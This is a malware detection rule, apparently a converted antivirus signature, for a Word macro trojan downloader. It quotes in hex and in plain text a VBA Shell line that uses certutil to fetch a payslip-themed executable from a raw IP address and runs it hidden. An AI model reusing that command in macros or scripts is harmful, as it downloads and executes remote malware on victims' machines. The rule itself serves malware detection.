
rule TrojanDownloader_O97M_EncDoc_KB_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.KB!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 38 30 2e 37 36 2e 35 31 2e 31 34 32 2f 6e 6f 64 2f 50 61 79 73 6c 69 70 73 25 32 30 2d 25 32 30 57 65 65 6b 25 32 30 45 6e 64 69 6e 67 25 32 30 31 39 25 32 30 4f 63 74 6f 62 65 72 25 32 30 32 30 32 32 2e 65 78 65 22 22 20 5a 68 6e 79 6f 69 7a 71 78 79 78 76 76 2e 65 78 65 2e 65 78 65 20 26 26 20 5a 68 6e 79 6f 69 7a 71 78 79 78 76 76 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29 } //1 = Shell("cmd /c certutil.exe -urlcache -split -f ""http://80.76.51.142/nod/Payslips%20-%20Week%20Ending%2019%20October%202022.exe"" Zhnyoizqxyxvv.exe.exe && Zhnyoizqxyxvv.exe.exe", vbHide)
	condition:
		((#a_01_0  & 1)*1) >=1
 
}